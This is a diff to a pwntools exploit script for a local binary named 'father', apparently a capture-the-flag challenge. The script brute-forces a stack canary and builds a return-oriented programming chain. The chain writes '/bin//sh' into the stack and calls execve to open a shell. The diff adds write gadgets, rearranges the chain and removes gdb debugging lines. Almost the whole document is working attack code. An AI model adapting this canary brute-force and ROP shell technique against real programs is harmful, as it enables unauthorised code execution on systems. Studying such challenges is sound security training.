@@ -16,6 +16,11 @@ from pwn import *
 0x0000000000410893: pop rsi; ret;
 0x0000000000401f13: pop rsp; ret;
 
+0x0000000000488931: mov qword ptr [rsi], rax; ret;
+0x000000000044707b: mov qword ptr [rdi], rsi; ret;
+0x0000000000435693: mov qword ptr [rdi], rdx; ret;
+0x000000000043538b: mov qword ptr [rdi], rcx; ret;
+
 0x0000000000422113: cdq; ret;
 
 0x00000000004013ec: syscall;
@@ -24,40 +29,39 @@ ROPGadgets """
 
 
 """ Values
-0x68732f2f6e69622f:   "/bin//sh"
-0x00007fffffffe430 -> 0x68732f2f6e69622f: "/bin//sh" = rdi
-0x0000000000000000:   0                              = rsi, rdx
-0x000000000000003b:   59                             = rax
+0x68732f2f6e69622f:   "/bin//sh"   <- rdi
+0x0000000000000000:   0             = rsi, rdx
+0x000000000000003b:   59            = rax
 Values """
 
 
 # Initial payload setting
-safe_stack_buf = p64(0x68732f2f6e69622f) + b'\x01' * 16
+safe_stack_buf = b'\x01' * 24
 
 canary = b""
 canary_len = 0
 byte_int_try = 0
 
-cover_rbp = b"\x01\x01\x01\x01\x01\x01\x01\x01"
+cover_rbp = b'\x01' * 8
 
 rop_chain = b""
-rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
-rop_chain += p64(0x00007fffffffe430) # var
-rop_chain += p64(0x0000000000410893) # -> pop rsi; ret;
-rop_chain += p64(0x0000000000000000) # var
 rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
-rop_chain += p64(0x0000000000000000) # var
+rop_chain += p64(0x68732f2f6e69622f) # var:("/bin//sh")
+rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
+rop_chain += p64(0x00007fffffffe3a0) # var:(address in the stack which will assign to rdi)
+rop_chain += p64(0x0000000000435693) # -> mov qword ptr [rdi], rdx; ret;
+rop_chain += p64(0x0000000000410893) # -> pop rsi; ret;
+rop_chain += p64(0x0000000000000000) # var:(0)
+rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
+rop_chain += p64(0x0000000000000000) # var:(0)
 rop_chain += p64(0x00000000004005cf) # -> pop rax; ret;
-rop_chain += p64(0x000000000000003b) # var
-rop_chain += p64(0x00000000004013ec) # syscall;
+rop_chain += p64(0x000000000000003b) # var:(59)
+rop_chain += p64(0x00000000004013ec) # -> syscall;
 
 
 # Start process
 p = process("./father", stderr=STDOUT)
 
-# attach process to gdb
-context.terminal = ['xterm-256color', '-e']
-gdb.attach(p)
 
 # Brute-Forcing Canary
 while True:
@@ -90,9 +94,6 @@ p.send(b'3\n')
 p.recvuntil(b"Please help me find my children !!!!!\n")
 
 print(canary.decode('latin-1').encode('unicode-escape').decode('ascii'))
-
 p.send(safe_stack_buf + canary + cover_rbp + rop_chain)
-
-gdb_command = 'x/40gx $rsi'
 
 p.interactive()
